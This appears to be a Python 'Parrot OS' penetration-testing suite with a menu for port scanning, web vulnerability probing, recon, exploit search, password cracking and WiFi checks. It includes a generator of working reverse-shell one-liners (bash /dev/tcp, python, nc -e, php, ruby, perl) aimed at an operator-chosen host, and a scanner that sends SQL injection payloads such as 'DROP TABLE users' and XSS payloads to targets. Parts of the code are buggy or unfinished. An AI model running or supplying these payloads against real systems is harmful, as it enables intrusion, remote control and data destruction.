#!/usr/bin/env python3
"""
Advanced Parrot OS Cybersecurity Suite
Professional-grade penetration testing and security assessment toolkit
"""

import os
import sys
import socket
import subprocess
import threading
import json
import re
import time
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Missing dependencies. Install with: pip3 install requests beautifulsoup4")
    sys.exit(1)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Logger:
    def __init__(self, log_dir="./logs"):
        self.log_dir = log_dir
        os.makedirs(log_dir, exist_ok=True)
        self.session_file = f"{log_dir}/session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        with open(self.session_file, 'a') as f:
            f.write(log_entry)
    
    def save_results(self, data, filename):
        filepath = f"{self.log_dir}/{filename}"
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=4)
        return filepath

logger = Logger()

def banner():
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║     PARROT OS - ADVANCED CYBERSECURITY SUITE             ║
    ║                                                           ║
    ║        Professional Penetration Testing Toolkit          ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Logs: {logger.session_file}{Colors.RESET}\n")

def clear():
    os.system('clear')

# ==================== ADVANCED PORT SCANNER ====================
class AdvancedPortScanner:
    def __init__(self, target, threads=100):
        self.target = target
        self.threads = threads
        self.open_ports = []
        self.services = {}
        
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                    banner = self.grab_banner(sock)
                    return (port, service, banner)
                except:
                    return (port, "unknown", None)
            sock.close()
        except:
            pass
        return None
    
    def grab_banner(self, sock):
        try:
            sock.send(b'HEAD / HTTP/1.1\r\nHost: test\r\n\r\n')
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            return banner[:100] if banner else None
        except:
            return None
    
    def scan(self, start_port=1, end_port=65535, common_only=False):
        if common_only:
            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 
                    1723, 3306, 3389, 5900, 8080, 8443, 8888]
        else:
            ports = range(start_port, end_port + 1)
        
        print(f"{Colors.GREEN}[+] Scanning {self.target} ({len(list(ports))} ports){Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Using {self.threads} threads{Colors.RESET}\n")
        
        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.scan_port, port): port for port in ports}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    port, service, banner = result
                    results.append(result)
                    print(f"{Colors.GREEN}[+] Port {port:5d} | {service:15s} | {banner if banner else 'No banner'}{Colors.RESET}")
        
        return results

# ==================== WEB VULNERABILITY SCANNER ====================
class WebVulnScanner:
    def __init__(self, url):
        self.url = url if url.startswith('http') else f'http://{url}'
        self.vulnerabilities = []
        
    def scan_sql_injection(self):
        print(f"{Colors.YELLOW}[*] Testing for SQL injection...{Colors.RESET}")
        payloads = ["'", "' OR '1'='1", "'; DROP TABLE users--", "' UNION SELECT NULL--"]
        
        try:
            for payload in payloads:
                test_url = f"{self.url}?id={payload}"
                response = requests.get(test_url, timeout=5)
                
                if any(error in response.text.lower() for error in 
                       ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'syntax error']):
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'HIGH',
                        'url': test_url,
                        'payload': payload
                    })
                    print(f"{Colors.RED}[!] Potential SQL injection found with payload: {payload}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error testing SQL injection: {e}{Colors.RESET}")
    
    def scan_xss(self):
        print(f"{Colors.YELLOW}[*] Testing for XSS vulnerabilities...{Colors.RESET}")
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        try:
            for payload in payloads:
                test_url = f"{self.url}?search={payload}"
                response = requests.get(test_url, timeout=5)
                
                if payload in response.text:
                    self.vulnerabilities.append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'MEDIUM',
                        'url': test_url,
                        'payload': payload
                    })
                    print(f"{Colors.RED}[!] Potential XSS found with payload: {payload}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error testing XSS: {e}{Colors.RESET}")
    
    def check_security_headers(self):
        print(f"{Colors.YELLOW}[*] Checking security headers...{Colors.RESET}")
        
        try:
            response = requests.get(self.url, timeout=5)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME type sniffing protection',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'XSS protection',
                'X-XSS-Protection': 'XSS filter'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    self.vulnerabilities.append({
                        'type': 'Missing Security Header',
                        'severity': 'LOW',
                        'header': header,
                        'description': description
                    })
                    print(f"{Colors.YELLOW}[!] Missing header: {header} ({description}){Colors.RESET}")
                else:
                    print(f"{Colors.GREEN}[+] Found header: {header}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error checking headers: {e}{Colors.RESET}")
    
    def scan_directories(self):
        print(f"{Colors.YELLOW}[*] Scanning for common directories...{Colors.RESET}")
        
        directories = [
            'admin', 'administrator', 'login', 'wp-admin', 'phpmyadmin',
            'cpanel', 'backup', 'uploads', 'files', 'images', 'css', 'js',
            'includes', 'api', 'test', 'dev', 'staging', 'old', 'temp'
        ]
        
        found_dirs = []
        for directory in directories:
            try:
                url = f"{self.url}/{directory}"
                response = requests.get(url, timeout=3, allow_redirects=False)
                
                if response.status_code in [200, 301, 302, 403]:
                    found_dirs.append((directory, response.status_code))
                    print(f"{Colors.GREEN}[+] Found: /{directory} (Status: {response.status_code}){Colors.RESET}")
            except:
                pass
        
        return found_dirs
    
    def full_scan(self):
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}Starting Web Vulnerability Scan: {self.url}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        self.scan_sql_injection()
        print()
        self.scan_xss()
        print()
        self.check_security_headers()
        print()
        self.scan_directories()
        
        return self.vulnerabilities

# ==================== NETWORK RECONNAISSANCE ====================
class NetworkRecon:
    @staticmethod
    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unable to determine"
    
    @staticmethod
    def get_public_ip():
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            return response.json()['ip']
        except:
            return "Unable to determine"
    
    @staticmethod
    def dns_lookup(domain):
        try:
            ip = socket.gethostbyname(domain)
            return ip
        except:
            return None
    
    @staticmethod
    def reverse_dns(ip):
        try:
            hostname = socket.gethostbyaddr(ip)
            return hostname[0]
        except:
            return None
    
    @staticmethod
    def traceroute(target, max_hops=30):
        print(f"{Colors.YELLOW}[*] Running traceroute to {target}...{Colors.RESET}\n")
        try:
            result = subprocess.run(['traceroute', target], capture_output=True, text=True, timeout=60)
            return result.stdout
        except:
            return "Traceroute failed or not installed"
    
    @staticmethod
    def ping_sweep(network):
        """Perform ping sweep on network (e.g., 192.168.1.0/24)"""
        print(f"{Colors.YELLOW}[*] Performing ping sweep on {network}...{Colors.RESET}\n")
        alive_hosts = []
        
        try:
            result = subprocess.run(['nmap', '-sn', network], capture_output=True, text=True, timeout=300)
            lines = result.stdout.split('\n')
            
            for line in lines:
                if 'Nmap scan report for' in line:
                    host = line.split('for ')[1].strip()
                    alive_hosts.append(host)
                    print(f"{Colors.GREEN}[+] Host alive: {host}{Colors.RESET}")
            
            return alive_hosts
        except:
            print(f"{Colors.RED}[!] Error: nmap not found or insufficient permissions{Colors.RESET}")
            return []

# ==================== EXPLOIT SEARCH ====================
class ExploitSearch:
    @staticmethod
    def search_exploitdb(query):
        """Search exploit-db for vulnerabilities"""
        print(f"{Colors.YELLOW}[*] Searching Exploit-DB for: {query}...{Colors.RESET}\n")
        
        try:
            result = subprocess.run(['searchsploit', query], capture_output=True, text=True)
            return result.stdout
        except:
            print(f"{Colors.RED}[!] searchsploit not found. Install with: sudo apt install exploitdb{Colors.RESET}")
            return None
    
    @staticmethod
    def search_cve(query):
        """Search for CVE information"""
        print(f"{Colors.YELLOW}[*] Searching for CVE information...{Colors.RESET}\n")
        
        try:
            url = f"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={query}"
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            results = []
            for item in soup.find_all('a', href=re.compile('CVE-')):
                cve_id = item.text.strip()
                if cve_id.startswith('CVE-'):
                    results.append(cve_id)
            
            return results[:10]  # Return top 10 results
        except Exception as e:
            print(f"{Colors.RED}[!] Error searching CVE: {e}{Colors.RESET}")
            return []

# ==================== PASSWORD UTILITIES ====================
class PasswordUtils:
    @staticmethod
    def generate_wordlist(base_word, output_file="wordlist.txt"):
        """Generate wordlist with common mutations"""
        print(f"{Colors.YELLOW}[*] Generating wordlist based on: {base_word}{Colors.RESET}")
        
        mutations = []
        
        # Original
        mutations.append(base_word)
        
        # Capitalization variations
        mutations.append(base_word.lower())
        mutations.append(base_word.upper())
        mutations.append(base_word.capitalize())
        
        # Common substitutions
        substitutions = {
            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
            's': ['5', '$'], 't': ['7'], 'l': ['1']
        }
        
        for char, subs in substitutions.items():
            for sub in subs:
                mutations.append(base_word.replace(char, sub))
                mutations.append(base_word.replace(char.upper(), sub))
        
        # Add numbers
        for i in range(0, 100):
            mutations.append(f"{base_word}{i}")
            mutations.append(f"{i}{base_word}")
        
        # Add special chars
        special = ['!', '@', '#', '$', '*', '123', '!@#']
        for s in special:
            mutations.append(f"{base_word}{s}")
        
        # Remove duplicates
        mutations = list(set(mutations))
        
        with open(output_file, 'w') as f:
            for word in mutations:
                f.write(word + '\n')
        
        print(f"{Colors.GREEN}[+] Generated {len(mutations)} passwords in {output_file}{Colors.RESET}")
        return mutations
    
    @staticmethod
    def crack_hash(hash_value, hash_type='md5', wordlist='/usr/share/wordlists/rockyou.txt'):
        """Use hashcat or john to crack hashes"""
        print(f"{Colors.YELLOW}[*] Attempting to crack {hash_type} hash...{Colors.RESET}")
        
        # Try john first
        try:
            with open('/tmp/hash.txt', 'w') as f:
                f.write(hash_value)
            
            result = subprocess.run(['john', '--format=raw-' + hash_type, '--wordlist=' + wordlist, '/tmp/hash.txt'],
                                  capture_output=True, text=True, timeout=300)
            
            # Show cracked password
            result = subprocess.run(['john', '--show', '/tmp/hash.txt'], capture_output=True, text=True)
            return result.stdout
        except:
            print(f"{Colors.RED}[!] Error: john not found{Colors.RESET}")
            return None

# ==================== WIRELESS SECURITY ====================
class WirelessSecurity:
    @staticmethod
    def scan_wifi():
        """Scan for nearby WiFi networks"""
        print(f"{Colors.YELLOW}[*] Scanning for WiFi networks...{Colors.RESET}\n")
        
        try:
            result = subprocess.run(['nmcli', 'dev', 'wifi', 'list'], capture_output=True, text=True)
            return result.stdout
        except:
            print(f"{Colors.RED}[!] Error: nmcli not found{Colors.RESET}")
            return None
    
    @staticmethod
    def check_wpa_handshake(pcap_file):
        """Check if pcap contains WPA handshake"""
        print(f"{Colors.YELLOW}[*] Checking for WPA handshake in {pcap_file}...{Colors.RESET}")
        
        try:
            result = subprocess.run(['aircrack-ng', pcap_file], capture_output=True, text=True)
            return result.stdout
        except:
            print(f"{Colors.RED}[!] Error: aircrack-ng not found{Colors.RESET}")
            return None

# ==================== PAYLOAD GENERATOR ====================
class PayloadGenerator:
    @staticmethod
    def reverse_shell(lhost, lport, shell_type='bash'):
        """Generate reverse shell payloads"""
        payloads = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        }
        
        return payloads.get(shell_type, "Invalid shell type")
    
    @staticmethod
    def sql_injection_payloads():
        """Return common SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' WAITFOR DELAY '00:00:05'--"
        ]

# ==================== REPORTING ====================
class ReportGenerator:
    @staticmethod
    def generate_report(data, report_type="scan"):
        """Generate HTML report"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"report_{report_type}_{timestamp}.html"
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Assessment Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
                .header {{ background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
                .section {{ background: white; margin: 20px 0; padding: 20px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .critical {{ color: #e74c3c; font-weight: bold; }}
                .high {{ color: #e67e22; font-weight: bold; }}
                .medium {{ color: #f39c12; font-weight: bold; }}
                .low {{ color: #3498db; font-weight: bold; }}
                table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
                th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
                th {{ background: #34495e; color: white; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Security Assessment Report</h1>
                <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
            <div class="section">
                <h2>Assessment Data</h2>
                <pre>{json.dumps(data, indent=2)}</pre>
            </div>
        </body>
        </html>
        """
        
        with open(filename, 'w') as f:
            f.write(html)
        
        print(f"{Colors.GREEN}[+] Report generated: {filename}{Colors.RESET}")
        return filename

# ==================== MAIN MENU ====================
def main_menu():
    while True:
        clear()
        banner()
        
        print(f"{Colors.BOLD}{Colors.CYAN}╔═══ RECONNAISSANCE ═══╗{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET} 1.  Advanced Port Scanner")
        print(f"{Colors.CYAN}║{Colors.RESET} 2.  Network Reconnaissance")
        print(f"{Colors.CYAN}║{Colors.RESET} 3.  Subdomain Enumeration")
        print(f"{Colors.CYAN}║{Colors.RESET} 4.  DNS Lookup & Reverse DNS")
        print(f"{Colors.CYAN}║{Colors.RESET} 5.  Ping Sweep Network")
        print(f"{Colors.CYAN}╚══════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}╔═══ WEB SECURITY ═══╗{Colors.RESET}")
        print(f"{Colors.MAGENTA}║{Colors.RESET} 6.  Web Vulnerability Scanner")
        print(f"{Colors.MAGENTA}║{Colors.RESET} 7.  SQL Injection Tester")
        print(f"{Colors.MAGENTA}║{Colors.RESET} 8.  XSS Scanner")
        print(f"{Colors.MAGENTA}║{Colors.RESET} 9.  Directory Bruteforce")
        print(f"{Colors.MAGENTA}╚════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.YELLOW}╔═══ EXPLOITATION ═══╗{Colors.RESET}")
        print(f"{Colors.YELLOW}║{Colors.RESET} 10. Search Exploit-DB")
        print(f"{Colors.YELLOW}║{Colors.RESET} 11. Search CVE Database")
        print(f"{Colors.YELLOW}║{Colors.RESET} 12. Payload Generator")
        print(f"{Colors.YELLOW}║{Colors.RESET} 13. Metasploit Interface")
        print(f"{Colors.YELLOW}╚════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}╔═══ PASSWORD ATTACKS ═══╗{Colors.RESET}")
        print(f"{Colors.GREEN}║{Colors.RESET} 14. Generate Wordlist")
        print(f"{Colors.GREEN}║{Colors.RESET} 15. Hash Cracker")
        print(f"{Colors.GREEN}║{Colors.RESET} 16. Password Generator")
        print(f"{Colors.GREEN}╚════════════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.BLUE}╔═══ WIRELESS ═══╗{Colors.RESET}")
        print(f"{Colors.BLUE}║{Colors.RESET} 17. WiFi Scanner")
        print(f"{Colors.BLUE}║{Colors.RESET} 18. Check WPA Handshake")
        print(f"{Colors.BLUE}╚════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.WHITE}╔═══ UTILITIES ═══╗{Colors.RESET}")
        print(f"{Colors.WHITE}║{Colors.RESET} 19. Generate Report")
        print(f"{Colors.WHITE}║{Colors.RESET} 20. Update Tools")
        print(f"{Colors.WHITE}║{Colors.RESET} 21. View Logs")
        print(f"{Colors.WHITE}╚═════════════════╝{Colors.RESET}")
        
        print(f"\n{Colors.RED}0. Exit{Colors.RESET}")
        
        try:
            choice = input(f"\n{Colors.CYAN}┌─[Select Option]")
            choice = input(f"{Colors.CYAN}└──╼ ${Colors.RESET} ")
            
            if choice == '1':
                target = input(f"{Colors.CYAN}Target IP/hostname: {Colors.RESET}")
                common = input(f"{Colors.CYAN}Scan common ports only? (y/n): {Colors.RESET}").lower() == 'y'
                scanner = AdvancedPortScanner(target)
                results = scanner.scan(common_only=common)
                logger.log(f"Port scan completed on {target}: {len(results)} ports found")
                
            elif choice == '2':
                print(f"\n{Colors.GREEN}[+] Local IP: {NetworkRecon.get_local_ip()}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Public IP: {NetworkRecon.get_public_ip()}{Colors.RESET}")
                
            elif choice == '3':
                domain = input(f"{Colors.CYAN}Domain to enumerate: {Colors.RESET}")
                # Call subdomain enumeration
                print(f"{Colors.YELLOW}[*] Feature in development...{Colors.RESET}")
                
            elif choice == '4':
                target = input(f"{Colors.CYAN}Enter domain or IP: {Colors.RESET}")
                if target.replace('.', '').isdigit():
                    result = NetworkRecon.reverse_dns(target)
                    print(f"{Colors.GREEN}[+] Hostname: {result}{Colors.RESET}")
                else:
                    result = NetworkRecon.dns_lookup(target)
                    print(f"{Colors.GREEN}[+] IP Address: {result}{Colors.RESET}")
                
            elif choice == '5':
                network = input(f"{Colors.CYAN}Network (e.g., 192.168.1.0/24): {Colors.RESET}")
                NetworkRecon.ping_sweep(network)
                
            elif choice == '6':
                url = input(f"{Colors.CYAN}Target URL: {Colors.RESET}")
                scanner = WebVulnScanner(url)
                vulns = scanner.full_scan()
                print(f"\n{Colors.GREEN}[+] Scan complete. Found {len(vulns)} vulnerabilities{Colors.RESET}")
                
            elif choice == '10':
                query = input(f"{Colors.CYAN}Search query: {Colors.RESET}")
                result = ExploitSearch.search_exploitdb(query)
                print(result)
                
            elif choice == '12':
                print(f"\n{Colors.CYAN}Payload Types:{Colors.RESET}")
                print("1. Reverse Shell\n2. SQL Injection\n3. XSS")
                ptype = input(f"{Colors.CYAN}Select type: {Colors.RESET}")
                
                if ptype == '1':
                    lhost = input(f"{Colors.CYAN}LHOST: {Colors.RESET}")
                    lport = input(f"{Colors.CYAN}LPORT: {Colors.RESET}")
                    shell = input(f"{Colors.CYAN}Shell type (bash/python/nc/php): {Colors.RESET}")
                    payload = PayloadGenerator.reverse_shell(lhost, lport, shell)
                    print(f"\n{Colors.GREEN}[+] Payload:{Colors.RESET}\n{payload}")
                
            elif choice == '14':
                base = input(f"{Colors.CYAN}Base word: {Colors.RESET}")
                PasswordUtils.generate_wordlist(base)
                
            elif choice == '17':
                result = WirelessSecurity.scan_wifi()
                print(result)
                
            elif choice == '19':
                print(f"{Colors.YELLOW}[*] Generating report...{Colors.RESET}")
                report_data = {"session": logger.session_file, "timestamp": str(datetime.now())}
                ReportGenerator.generate_report(report_data)
                
            elif choice == '20':
                print(f"{Colors.YELLOW}[*] Updating system and tools...{Colors.RESET}")
                os.system('sudo apt update && sudo apt upgrade -y')
                
            elif choice == '21':
                os.system(f'cat {logger.session_file}')
                
            elif choice == '0':
                print(f"\n{Colors.GREEN}[+] Exiting... Stay ethical!{Colors.RESET}\n")
                sys.exit(0)
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")
            
            input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.RESET}")
            input(f"{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
            logger.log(f"Error: {e}", "ERROR")
            input(f"{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Colors.YELLOW}[!] Warning: Some features require root privileges{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Run with: sudo python3 {sys.argv[0]}{Colors.RESET}\n")
    
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.GREEN}[+] Goodbye!{Colors.RESET}\n")
        sys.exit(0)